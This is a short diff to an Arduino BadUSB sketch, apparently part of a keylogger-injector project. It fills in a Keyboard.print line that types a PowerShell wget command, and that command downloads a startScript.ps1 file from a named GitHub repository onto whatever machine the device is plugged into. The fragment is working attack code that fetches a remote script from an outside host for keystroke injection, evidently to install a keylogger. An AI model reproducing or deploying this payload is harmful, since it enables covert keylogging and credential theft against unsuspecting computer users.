@@ -92,7 +92,7 @@ void setup()
 
   //Download ps1 sript
 
-  Keyboard.print("wget LINK -OutFile startScript.ps1");
+  Keyboard.print("wget https://github.com/triskattie/BadUSB_keyloggerInjector/blob/main/startScript.ps1 -OutFile startScript.ps1");
 
   typeKey(KEY_RETURN);
 
@@ -144,3 +144,4 @@ void setup()
 
 // Unused
 void loop() {}
+
